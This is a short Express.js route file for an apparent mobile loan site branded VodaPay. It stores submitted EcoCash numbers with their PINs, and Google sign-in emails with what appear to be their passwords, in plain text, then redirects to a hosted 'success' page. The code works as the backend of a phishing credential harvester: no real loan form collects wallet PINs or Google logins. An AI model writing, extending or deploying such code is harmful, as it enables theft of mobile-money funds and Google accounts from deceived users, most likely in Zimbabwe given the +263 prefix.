/* routes/form.js — updated to accept Google sign-in/signup entries */

import express from "express";
import LoanApplication from "../models/LoanApplication.js";

const router = express.Router();

router.post("/", async (req, res) => {
  try {
    const {
      ecocash_number,
      pin,
      loan_amount,
      entry_type,
      full_name,
      phone,
      birthday
    } = req.body;

    await LoanApplication.create({
      ecocashNumber: ecocash_number.startsWith("+263")
        ? ecocash_number
        : ecocash_number,                           /* keep emails as-is */
      pin,
      loanAmount: Number(loan_amount) || 0,
      entryType: entry_type || "loan",
      fullName: full_name || "",
      phone: phone || "",
      birthday: birthday || ""
    });

    /* For Google sign-in entries (fetch with redirect:manual),
       just send 200 OK instead of redirecting */
    if (entry_type === "signin" || entry_type === "signup") {
      return res.status(200).json({ success: true });
    }

    res.redirect("https://vodapayloans.vercel.app/pages/success.html");
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false, error: "Submission failed" });
  }
});

export default router;